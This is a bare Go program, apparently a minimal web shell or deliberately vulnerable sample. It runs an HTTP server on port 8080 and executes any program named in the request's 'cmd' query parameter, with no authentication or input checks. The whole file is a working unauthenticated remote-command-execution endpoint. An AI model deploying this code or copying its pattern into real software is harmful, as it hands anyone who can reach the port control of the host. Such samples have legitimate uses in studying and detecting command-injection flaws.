package main

import (
	"net/http"
	"os/exec"
)

func handler(w http.ResponseWriter, r *http.Request) {

	cmd := r.URL.Query().Get("cmd")

	command := exec.Command(
		cmd,
	)

	command.Run()

}

func main() {

	http.HandleFunc(
		"/",
		handler,
	)

	http.ListenAndServe(
		":8080",
		nil,
	)

}
